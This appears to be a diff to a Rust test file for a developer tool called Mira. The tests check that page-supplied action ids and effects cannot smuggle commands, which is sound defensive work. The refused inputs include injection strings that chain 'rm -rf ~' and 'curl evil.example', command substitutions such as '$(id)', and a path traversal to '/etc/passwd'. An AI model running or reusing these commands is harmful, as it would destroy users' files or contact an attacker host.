@@ -703,3 +703,179 @@ fn a_stored_port_that_is_not_a_port_never_becomes_one() {
         5_173
     );
 }
+
+// ── Naming an action (slice 4d) ──────────────────────────────────────────────
+
+/// An action id, as it would arrive from a page.
+fn action_id(raw: serde_json::Value) -> Result<mira_core::ActionId, serde_json::Error> {
+    serde_json::from_value(raw)
+}
+
+#[test]
+fn an_action_id_is_a_catalogue_slug_and_nothing_else() {
+    for accepted in [
+        "open-editor",
+        "open-terminal",
+        "reveal-project",
+        "refresh",
+        "mark-opened",
+    ] {
+        assert!(
+            action_id(json!(accepted)).is_ok(),
+            "{accepted} must deserialise"
+        );
+    }
+}
+
+#[test]
+fn nothing_that_could_be_run_deserialises_as_an_action_id() {
+    // Every one of these is what somebody would put where the action goes if
+    // they were trying to make Mira run something. None survives the wire.
+    for refused in [
+        json!("npm run dev"),
+        json!("pnpm -w build"),
+        json!("cargo run --release"),
+        json!("yarn start && curl evil.example"),
+        json!("/bin/sh"),
+        json!("/usr/bin/env node"),
+        json!("sh -c 'rm -rf ~'"),
+        json!("open-editor; rm -rf ~"),
+        json!("open-editor && echo"),
+        json!("open-editor | tee"),
+        json!("open-editor`whoami`"),
+        json!("open-editor$(id)"),
+        json!("../../etc/passwd"),
+        json!("Open-Editor"),
+        json!("open editor"),
+        json!("open\neditor"),
+        json!("open\u{0}editor"),
+        json!(""),
+        json!("x".repeat(33)),
+        json!(0),
+        json!(true),
+        json!(null),
+        json!(["open-editor"]),
+        json!({ "program": "code" }),
+    ] {
+        assert!(
+            action_id(refused.clone()).is_err(),
+            "{refused} must not deserialise into an action id"
+        );
+    }
+}
+
+#[test]
+fn a_well_formed_id_for_an_action_mira_does_not_have_resolves_to_nothing() {
+    // The half validation cannot do. `run`, `build` and `deploy` are perfectly
+    // good slugs; they name no catalogue row, so they become nothing at all.
+    for unknown in [
+        "run",
+        "build",
+        "deploy",
+        "test",
+        "start",
+        "npm-run-dev",
+        "some-action",
+    ] {
+        let parsed: mira_core::ActionId = unknown.parse().expect("a well-formed id");
+        assert!(
+            mira_core::action::find(&parsed).is_none(),
+            "{unknown} resolved to an action"
+        );
+    }
+
+    // And every catalogue id does resolve, so this is not passing vacuously.
+    for action in mira_core::CATALOGUE {
+        let parsed: mira_core::ActionId = action.id.parse().expect("a catalogue id");
+        assert!(mira_core::action::find(&parsed).is_some());
+    }
+}
+
+#[test]
+fn a_forged_effect_cannot_smuggle_something_to_run() {
+    // `Effect` travels outward, but a type that deserialises is a type a page
+    // could try to hand back. Every variant is a fixed shape and none has a
+    // field a program, an argument list or a path could live in.
+    let open: mira_core::Effect = serde_json::from_value(json!({
+        "does": "openIn",
+        "kind": "editor",
+        "program": "/bin/sh",
+        "args": ["-c", "curl evil.example"],
+        "cwd": "/",
+        "shell": true
+    }))
+    .expect("an effect");
+
+    assert_eq!(
+        open,
+        mira_core::Effect::OpenIn {
+            kind: mira_core::AppKind::Editor
+        },
+        "every stray key is dropped, not carried"
+    );
+
+    // And there is no variant for running anything, so nothing names one.
+    for invented in ["run", "exec", "shell", "script", "spawn", "stop", "kill"] {
+        assert!(
+            serde_json::from_value::<mira_core::Effect>(json!({ "does": invented })).is_err(),
+            "{invented} must not be an effect"
+        );
+    }
+}
+
+#[test]
+fn a_forged_action_state_carries_no_instruction() {
+    let ready: mira_core::ActionState = serde_json::from_value(json!({
+        "kind": "ready",
+        "detail": "Visual Studio Code",
+        "command": "code .",
+        "argv": ["code", "."]
+    }))
+    .expect("a state");
+
+    assert_eq!(
+        ready,
+        mira_core::ActionState::Ready {
+            detail: Some("Visual Studio Code".to_owned())
+        }
+    );
+
+    let back = serde_json::to_value(ready).expect("serialise");
+    let object = back.as_object().expect("an object");
+    assert_eq!(
+        object.len(),
+        2,
+        "kind and detail, nothing else: {object:#?}"
+    );
+}
+
+#[test]
+fn the_catalogue_is_small_and_every_row_says_what_it_does() {
+    // The catalogue is the privilege surface, so its size is part of the
+    // review. A row without a sentence explaining it is a row somebody would
+    // press without knowing what it does.
+    assert_eq!(mira_core::CATALOGUE.len(), 6, "the catalogue grew");
+
+    for action in mira_core::CATALOGUE {
+        assert!(!action.label.is_empty(), "{} has no label", action.id);
+        assert!(
+            action.describes.len() > 20,
+            "{} does not say what it does: {:?}",
+            action.id,
+            action.describes
+        );
+        assert!(!action.icon.is_empty(), "{} has no icon", action.id);
+        assert!(
+            action.id.parse::<mira_core::ActionId>().is_ok(),
+            "{} is not a well-formed id",
+            action.id
+        );
+    }
+
+    // Ids are unique, so one identity never means two things.
+    let mut ids: Vec<&str> = mira_core::CATALOGUE.iter().map(|a| a.id).collect();
+    ids.sort_unstable();
+    let before = ids.len();
+    ids.dedup();
+    assert_eq!(ids.len(), before, "two catalogue rows share an id");
+}
